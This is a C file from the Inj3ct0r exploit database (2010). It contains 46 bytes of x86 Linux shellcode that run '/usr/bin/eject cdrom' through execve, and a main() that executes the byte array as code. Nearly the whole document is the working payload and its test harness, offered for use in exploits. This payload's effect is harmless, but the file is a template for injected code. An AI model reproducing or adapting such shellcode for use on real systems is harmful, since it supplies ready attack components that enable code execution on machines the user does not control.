/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
1               #########################################              1
0               I'm gunslinger_ member from Inj3ct0r Team              1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Name   : 46 bytes cdrom ejecting x86 linux shellcode
Date   : may, 31 2010
Author : gunslinger_
Web    : devilzc0de.com
blog   : gunslingerc0de.wordpress.com
tested on : ubuntu linux
*/

char sc[] = 	"\x6a\x0b\x58\x99\x52"
		"\x6a\x6d\x68\x63\x64"
		"\x72\x6f\x89\xe1\x52"
		"\x66\x68\x63\x74\x68"
		"\x2f\x65\x6a\x65\x68"
		"\x2f\x62\x69\x6e\x68"
		"\x2f\x75\x73\x72\x89"
		"\xe3\x52\x51\x53\x89"
		"\xe1\xcd\x80\x40\xcd"
		"\x80";

int main(void)
{
	(*(void(*)()) sc)();

return 0;
}